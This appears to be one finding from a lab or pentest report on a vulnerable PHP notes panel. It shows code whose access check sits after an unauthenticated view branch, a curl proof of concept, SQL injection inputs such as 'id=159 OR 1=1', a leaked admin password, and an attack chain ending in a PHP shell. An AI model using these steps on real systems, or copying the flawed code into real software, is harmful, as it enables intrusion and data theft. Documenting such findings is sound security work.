# 08 — Broken access control: unauthenticated note read (IDOR)

- **OWASP Top 10 (2021):** A01:2021 – Broken Access Control
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/panel/notes.php:5-22` — `GET /panel/notes.php?action=view&id=<N>`:

```php
if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['id'])) {
    $id = $_GET['id'];
    $db = get_app_db();
    $r = mysqli_query($db, 'SELECT * FROM notes WHERE id = ' . $id);
    ...
    exit;                       // ← the view branch ends here
}
$me = require_login();          // ← auth check is ONLY reached after the branch
```

## How it works (root cause)

The `action=view` branch is handled **before** `require_login()` (line 23).
So reading a note requires no session at all, and there is no
`user_id = current user` restriction either — any `id` is readable by
anyone. Classic missing auth + IDOR in one.

(`id` is also concatenated unescaped, so `id=159 OR 1=1` is a bonus SQLi;
the main issue here is access control.)

## Exploitation steps

No login, no cookie:

```bash
curl -s 'http://localhost:8080/panel/notes.php?action=view&id=159'
```

## Working PoC (verified)

```
GET /panel/notes.php?action=view&id=159
```

Response contains the note body:

```
you know what it is Elessar, Elfstone, Strider, heir of Isildur,
ancient king of Arnor and Gondor
```

which is the **admin password hint** (password: `Aragorn2025!`).

## Expected result / verification

- Any note id (140, 143, 147, 151, 156, 159, 164, 168, …) is readable
  without authentication.
- The admin-only note 159 leaks the password hint that leads directly to
  the admin account.
- Bonus: `id=999 OR 1=1` returns a row (SQLi on the same parameter).

## Attack chain

```
unauthenticated IDOR
  → read note 159 → admin password hint
  → login as admin with the hinted password
  → /panel/upload.php (16) → PHP shell → RCE
Or:
  → read other users' private notes (confidentiality loss)
  → note ids are sequential (09) → trivially enumerable
```

## Notes

- The same file's list view (line 40) correctly scopes to
  `WHERE user_id = <me>`, so the bug is specifically the unauthenticated
  `view` branch.
- Because the view output is unescaped (lines 13/15), notes can also carry
  stored XSS for whoever opens the link — but the primary impact is the
  missing access control.
